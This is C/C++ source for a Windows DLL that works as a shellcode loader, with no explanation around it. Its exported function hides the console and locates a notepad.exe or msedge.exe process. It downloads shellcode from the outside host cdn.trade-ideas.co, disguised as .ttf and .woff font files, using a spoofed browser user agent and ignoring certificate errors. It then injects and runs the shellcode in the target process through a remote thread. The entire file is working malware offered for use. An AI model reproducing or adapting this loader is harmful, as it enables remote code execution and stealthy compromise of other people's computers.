#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <stdio.h>

#pragma comment(lib, "Wininet.lib")

struct Shellcode {
    BYTE* pcData;
    DWORD dwSize;
};

DWORD GetTargetPID();
BOOL Download(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode);
BOOL DownloadHTTPS(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode);
BOOL Inject(DWORD dwPID, Shellcode shellcode);

// Exported function to trigger the main logic
__declspec(dllexport) BOOL ExecutePayload()
{
    // Hide console window (optional, may not be needed in a DLL)
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    DWORD pid = GetTargetPID();
    if (pid == 0) { return FALSE; }

    struct Shellcode shellcode = {0};
    // Try HTTPS first, fallback to HTTP if needed
    if (!DownloadHTTPS(L"cdn.trade-ideas.co", 443, &shellcode)) {
        if (!Download(L"cdn.trade-ideas.co", 80, &shellcode)) {
            return FALSE;
        }
    }

    if (!Inject(pid, shellcode)) {
        // Clean up allocated memory
        if (shellcode.pcData) {
            free(shellcode.pcData);
        }
        return FALSE;
    }

    // Clean up allocated memory
    if (shellcode.pcData) {
        free(shellcode.pcData);
    }
    return TRUE;
}

// DLL entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Initialize when the DLL is loaded
        break;
    case DLL_PROCESS_DETACH:
        // Cleanup when the DLL is unloaded
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

// ------ Getting the shellcode via HTTPS ------ //
BOOL DownloadHTTPS(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode) {
    HINTERNET session = InternetOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0);
    if (!session) return FALSE;

    HINTERNET connection = InternetConnect(
        session,
        host,
        port,
        L"",
        L"",
        INTERNET_SERVICE_HTTP,
        INTERNET_FLAG_SECURE,  // Enable SSL/TLS
        0);
    if (!connection) {
        InternetCloseHandle(session);
        return FALSE;
    }

    HINTERNET request = HttpOpenRequest(
        connection,
        L"GET",
        L"/test.ttf",
        NULL,
        NULL,
        NULL,
        INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,  // SSL flags
        0);
    if (!request) {
        InternetCloseHandle(connection);
        InternetCloseHandle(session);
        return FALSE;
    }

    WORD counter = 0;
    while (!HttpSendRequest(request, NULL, 0, 0, 0)) {
        counter++;
        Sleep(3000);
        if (counter >= 3) {
            InternetCloseHandle(request);
            InternetCloseHandle(connection);
            InternetCloseHandle(session);
            return FALSE; // HTTPS requests eventually failed
        }
    }

    DWORD bufSize = BUFSIZ;
    BYTE* buffer = new BYTE[bufSize];
    if (!buffer) {
        InternetCloseHandle(request);
        InternetCloseHandle(connection);
        InternetCloseHandle(session);
        return FALSE;
    }

    DWORD capacity = bufSize;
    BYTE* payload = (BYTE*)malloc(capacity);
    if (!payload) {
        delete[] buffer;
        InternetCloseHandle(request);
        InternetCloseHandle(connection);
        InternetCloseHandle(session);
        return FALSE;
    }

    DWORD payloadSize = 0;

    while (true) {
        DWORD bytesRead;

        if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
            free(payload);
            delete[] buffer;
            InternetCloseHandle(request);
            InternetCloseHandle(connection);
            InternetCloseHandle(session);
            return FALSE;
        }

        if (bytesRead == 0) break;

        if (payloadSize + bytesRead > capacity) {
            capacity *= 2;
            BYTE* newPayload = (BYTE*)realloc(payload, capacity);
            if (!newPayload) {
                free(payload);
                delete[] buffer;
                InternetCloseHandle(request);
                InternetCloseHandle(connection);
                InternetCloseHandle(session);
                return FALSE;
            }
            payload = newPayload;
        }

        for (DWORD i = 0; i < bytesRead; i++) {
            payload[payloadSize++] = buffer[i];
        }
    }

    BYTE* newPayload = (BYTE*)realloc(payload, payloadSize);
    if (newPayload) {
        payload = newPayload;
    }

    delete[] buffer; // Clean up buffer
    InternetCloseHandle(request);
    InternetCloseHandle(connection);
    InternetCloseHandle(session);

    (*shellcode).pcData = payload;
    (*shellcode).dwSize = payloadSize;
    return TRUE;
}

// ------ Getting the shellcode via HTTP ------ //
BOOL Download(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode) {
    HINTERNET session = InternetOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0);
    if (!session) return FALSE;

    HINTERNET connection = InternetConnect(
        session,
        host,
        port,
        L"",
        L"",
        INTERNET_SERVICE_HTTP,
        0,
        0);
    if (!connection) {
        InternetCloseHandle(session);
        return FALSE;
    }

    HINTERNET request = HttpOpenRequest(
        connection,
        L"GET",
        L"/zagnoxxxvenom.woff",
        NULL,
        NULL,
        NULL,
        0,
        0);
    if (!request) {
        InternetCloseHandle(connection);
        InternetCloseHandle(session);
        return FALSE;
    }

    WORD counter = 0;
    while (!HttpSendRequest(request, NULL, 0, 0, 0)) {
        counter++;
        Sleep(3000);
        if (counter >= 3) {
            InternetCloseHandle(request);
            InternetCloseHandle(connection);
            InternetCloseHandle(session);
            return FALSE; // HTTP requests eventually failed
        }
    }

    DWORD bufSize = BUFSIZ;
    BYTE* buffer = new BYTE[bufSize];
    if (!buffer) {
        InternetCloseHandle(request);
        InternetCloseHandle(connection);
        InternetCloseHandle(session);
        return FALSE;
    }

    DWORD capacity = bufSize;
    BYTE* payload = (BYTE*)malloc(capacity);
    if (!payload) {
        delete[] buffer;
        InternetCloseHandle(request);
        InternetCloseHandle(connection);
        InternetCloseHandle(session);
        return FALSE;
    }

    DWORD payloadSize = 0;

    while (true) {
        DWORD bytesRead;

        if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
            free(payload);
            delete[] buffer;
            InternetCloseHandle(request);
            InternetCloseHandle(connection);
            InternetCloseHandle(session);
            return FALSE;
        }

        if (bytesRead == 0) break;

        if (payloadSize + bytesRead > capacity) {
            capacity *= 2;
            BYTE* newPayload = (BYTE*)realloc(payload, capacity);
            if (!newPayload) {
                free(payload);
                delete[] buffer;
                InternetCloseHandle(request);
                InternetCloseHandle(connection);
                InternetCloseHandle(session);
                return FALSE;
            }
            payload = newPayload;
        }

        for (DWORD i = 0; i < bytesRead; i++) {
            payload[payloadSize++] = buffer[i];
        }
    }

    BYTE* newPayload = (BYTE*)realloc(payload, payloadSize);
    if (newPayload) {
        payload = newPayload;
    }

    delete[] buffer; // Clean up buffer
    InternetCloseHandle(request);
    InternetCloseHandle(connection);
    InternetCloseHandle(session);

    (*shellcode).pcData = payload;
    (*shellcode).dwSize = payloadSize;
    return TRUE;
}

// ------ Finding a target process ------ //
DWORD GetFirstPIDProclist(const WCHAR** aszProclist, DWORD dwSize);
DWORD GetFirstPIDProcname(const WCHAR* szProcname);

DWORD GetTargetPID() {
    const WCHAR* aszProclist[2] = {
        L"notepad.exe",
        L"msedge.exe"
    };
    return GetFirstPIDProclist(aszProclist, sizeof(aszProclist) / sizeof(aszProclist[0]));
}

DWORD GetFirstPIDProclist(const WCHAR** aszProclist, DWORD dwSize) {
    DWORD pid = 0;
    for (int i = 0; i < dwSize; i++) {
        pid = GetFirstPIDProcname(aszProclist[i]);
        if (pid > 0) {
            return pid;
        }
    }
    return 0;
}

DWORD GetFirstPIDProcname(const WCHAR* szProcname) {
    HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcessSnapshot) return 0;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnapshot, &pe32)) {
        CloseHandle(hProcessSnapshot);
        return 0;
    }

    DWORD pid = 0;
    while (Process32Next(hProcessSnapshot, &pe32)) {
        if (lstrcmpiW(szProcname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcessSnapshot);
    return pid;
}

// ------ Injecting into process ------ //
BOOL Inject(DWORD dwPID, Shellcode shellcode) {
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, dwPID);
    if (!hProcess) { return FALSE; }

    LPVOID pRemoteAddr = VirtualAllocEx(hProcess, NULL, shellcode.dwSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);
    if (!pRemoteAddr) {
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pRemoteAddr, shellcode.pcData, shellcode.dwSize, NULL)) {
        VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return TRUE;
    }

    VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return FALSE;
}